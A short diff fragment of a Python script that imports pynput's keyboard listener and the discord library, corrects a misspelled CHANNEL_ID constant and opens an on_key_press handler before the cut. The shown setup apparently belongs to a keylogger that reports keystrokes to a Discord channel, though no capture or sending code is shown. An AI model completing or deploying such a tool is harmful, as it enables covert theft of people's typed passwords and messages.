@@ -1,7 +1,7 @@
 from pynput import keyboard
 import discord
 from discord.ext import commands
-HANNEL_ID = abx
+CHANNEL_ID = abx
 
 def on_key_press(key):
     try:
